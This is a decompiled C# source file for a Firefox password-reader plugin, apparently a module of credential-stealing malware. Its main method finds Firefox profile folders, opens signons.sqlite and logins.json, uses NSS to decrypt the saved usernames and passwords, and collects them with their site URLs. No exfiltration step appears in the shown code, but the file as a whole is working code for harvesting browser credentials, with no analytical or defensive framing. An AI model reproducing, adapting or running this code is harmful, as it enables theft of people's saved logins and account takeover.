using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using Newtonsoft.Json;

namespace Plugin.Browsers.Firefox
{
	// Token: 0x02000012 RID: 18
	internal class FirefoxPassReader : IPassReader
	{
		// Token: 0x17000013 RID: 19
		// (get) Token: 0x06000083 RID: 131 RVA: 0x00005E64 File Offset: 0x00004064
		public string BrowserName
		{
			get
			{
				return "Firefox";
			}
		}

		// Token: 0x06000084 RID: 132 RVA: 0x00005E7C File Offset: 0x0000407C
		public IEnumerable<CredentialModel> ReadPasswords()
		{
			string signonsFile = null;
			string loginsFile = null;
			bool signonsFound = false;
			bool loginsFound = false;
			string[] dirs = Directory.GetDirectories(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Mozilla\\Firefox\\Profiles"));
			List<CredentialModel> logins = new List<CredentialModel>();
			bool flag = dirs.Length == 0;
			IEnumerable<CredentialModel> result;
			if (flag)
			{
				result = logins;
			}
			else
			{
				foreach (string dir in dirs)
				{
					string[] files = Directory.GetFiles(dir, "signons.sqlite");
					bool flag2 = files.Length != 0;
					if (flag2)
					{
						signonsFile = files[0];
						signonsFound = true;
					}
					files = Directory.GetFiles(dir, "logins.json");
					bool flag3 = files.Length != 0;
					if (flag3)
					{
						loginsFile = files[0];
						loginsFound = true;
					}
					bool flag4 = loginsFound || signonsFound;
					if (flag4)
					{
						FFDecryptor.NSS_Init(dir);
						break;
					}
				}
				bool flag5 = signonsFound;
				if (flag5)
				{
					using (SQLiteConnection conn = new SQLiteConnection("Data Source=" + signonsFile + ";"))
					{
						conn.Open();
						using (SQLiteCommand command = conn.CreateCommand())
						{
							command.CommandText = "SELECT encryptedUsername, encryptedPassword, hostname FROM moz_logins";
							using (SQLiteDataReader reader = command.ExecuteReader())
							{
								while (reader.Read())
								{
									string username = FFDecryptor.Decrypt(reader.GetString(0));
									string password = FFDecryptor.Decrypt(reader.GetString(1));
									logins.Add(new CredentialModel
									{
										Username = username,
										Password = password,
										Url = reader.GetString(2)
									});
								}
							}
						}
						conn.Close();
					}
				}
				bool flag6 = loginsFound;
				if (flag6)
				{
					FirefoxPassReader.FFLogins ffLoginData;
					using (StreamReader sr = new StreamReader(loginsFile))
					{
						string json = sr.ReadToEnd();
						ffLoginData = JsonConvert.DeserializeObject<FirefoxPassReader.FFLogins>(json);
					}
					foreach (FirefoxPassReader.LoginData loginData in ffLoginData.logins)
					{
						string username2 = FFDecryptor.Decrypt(loginData.encryptedUsername);
						string password2 = FFDecryptor.Decrypt(loginData.encryptedPassword);
						logins.Add(new CredentialModel
						{
							Username = username2,
							Password = password2,
							Url = loginData.hostname
						});
					}
				}
				result = logins;
			}
			return result;
		}

		// Token: 0x02000020 RID: 32
		private class FFLogins
		{
			// Token: 0x17000014 RID: 20
			// (get) Token: 0x060000AC RID: 172 RVA: 0x00006FA3 File Offset: 0x000051A3
			// (set) Token: 0x060000AD RID: 173 RVA: 0x00006FAB File Offset: 0x000051AB
			public long nextId { get; set; }

			// Token: 0x17000015 RID: 21
			// (get) Token: 0x060000AE RID: 174 RVA: 0x00006FB4 File Offset: 0x000051B4
			// (set) Token: 0x060000AF RID: 175 RVA: 0x00006FBC File Offset: 0x000051BC
			public FirefoxPassReader.LoginData[] logins { get; set; }

			// Token: 0x17000016 RID: 22
			// (get) Token: 0x060000B0 RID: 176 RVA: 0x00006FC5 File Offset: 0x000051C5
			// (set) Token: 0x060000B1 RID: 177 RVA: 0x00006FCD File Offset: 0x000051CD
			public string[] disabledHosts { get; set; }

			// Token: 0x17000017 RID: 23
			// (get) Token: 0x060000B2 RID: 178 RVA: 0x00006FD6 File Offset: 0x000051D6
			// (set) Token: 0x060000B3 RID: 179 RVA: 0x00006FDE File Offset: 0x000051DE
			public int version { get; set; }
		}

		// Token: 0x02000021 RID: 33
		private class LoginData
		{
			// Token: 0x17000018 RID: 24
			// (get) Token: 0x060000B5 RID: 181 RVA: 0x00006FF0 File Offset: 0x000051F0
			// (set) Token: 0x060000B6 RID: 182 RVA: 0x00006FF8 File Offset: 0x000051F8
			public long id { get; set; }

			// Token: 0x17000019 RID: 25
			// (get) Token: 0x060000B7 RID: 183 RVA: 0x00007001 File Offset: 0x00005201
			// (set) Token: 0x060000B8 RID: 184 RVA: 0x00007009 File Offset: 0x00005209
			public string hostname { get; set; }

			// Token: 0x1700001A RID: 26
			// (get) Token: 0x060000B9 RID: 185 RVA: 0x00007012 File Offset: 0x00005212
			// (set) Token: 0x060000BA RID: 186 RVA: 0x0000701A File Offset: 0x0000521A
			public string url { get; set; }

			// Token: 0x1700001B RID: 27
			// (get) Token: 0x060000BB RID: 187 RVA: 0x00007023 File Offset: 0x00005223
			// (set) Token: 0x060000BC RID: 188 RVA: 0x0000702B File Offset: 0x0000522B
			public string httprealm { get; set; }

			// Token: 0x1700001C RID: 28
			// (get) Token: 0x060000BD RID: 189 RVA: 0x00007034 File Offset: 0x00005234
			// (set) Token: 0x060000BE RID: 190 RVA: 0x0000703C File Offset: 0x0000523C
			public string formSubmitURL { get; set; }

			// Token: 0x1700001D RID: 29
			// (get) Token: 0x060000BF RID: 191 RVA: 0x00007045 File Offset: 0x00005245
			// (set) Token: 0x060000C0 RID: 192 RVA: 0x0000704D File Offset: 0x0000524D
			public string usernameField { get; set; }

			// Token: 0x1700001E RID: 30
			// (get) Token: 0x060000C1 RID: 193 RVA: 0x00007056 File Offset: 0x00005256
			// (set) Token: 0x060000C2 RID: 194 RVA: 0x0000705E File Offset: 0x0000525E
			public string passwordField { get; set; }

			// Token: 0x1700001F RID: 31
			// (get) Token: 0x060000C3 RID: 195 RVA: 0x00007067 File Offset: 0x00005267
			// (set) Token: 0x060000C4 RID: 196 RVA: 0x0000706F File Offset: 0x0000526F
			public string encryptedUsername { get; set; }

			// Token: 0x17000020 RID: 32
			// (get) Token: 0x060000C5 RID: 197 RVA: 0x00007078 File Offset: 0x00005278
			// (set) Token: 0x060000C6 RID: 198 RVA: 0x00007080 File Offset: 0x00005280
			public string encryptedPassword { get; set; }

			// Token: 0x17000021 RID: 33
			// (get) Token: 0x060000C7 RID: 199 RVA: 0x00007089 File Offset: 0x00005289
			// (set) Token: 0x060000C8 RID: 200 RVA: 0x00007091 File Offset: 0x00005291
			public string guid { get; set; }

			// Token: 0x17000022 RID: 34
			// (get) Token: 0x060000C9 RID: 201 RVA: 0x0000709A File Offset: 0x0000529A
			// (set) Token: 0x060000CA RID: 202 RVA: 0x000070A2 File Offset: 0x000052A2
			public int encType { get; set; }

			// Token: 0x17000023 RID: 35
			// (get) Token: 0x060000CB RID: 203 RVA: 0x000070AB File Offset: 0x000052AB
			// (set) Token: 0x060000CC RID: 204 RVA: 0x000070B3 File Offset: 0x000052B3
			public long timeCreated { get; set; }

			// Token: 0x17000024 RID: 36
			// (get) Token: 0x060000CD RID: 205 RVA: 0x000070BC File Offset: 0x000052BC
			// (set) Token: 0x060000CE RID: 206 RVA: 0x000070C4 File Offset: 0x000052C4
			public long timeLastUsed { get; set; }

			// Token: 0x17000025 RID: 37
			// (get) Token: 0x060000CF RID: 207 RVA: 0x000070CD File Offset: 0x000052CD
			// (set) Token: 0x060000D0 RID: 208 RVA: 0x000070D5 File Offset: 0x000052D5
			public long timePasswordChanged { get; set; }

			// Token: 0x17000026 RID: 38
			// (get) Token: 0x060000D1 RID: 209 RVA: 0x000070DE File Offset: 0x000052DE
			// (set) Token: 0x060000D2 RID: 210 RVA: 0x000070E6 File Offset: 0x000052E6
			public long timesUsed { get; set; }
		}
	}
}
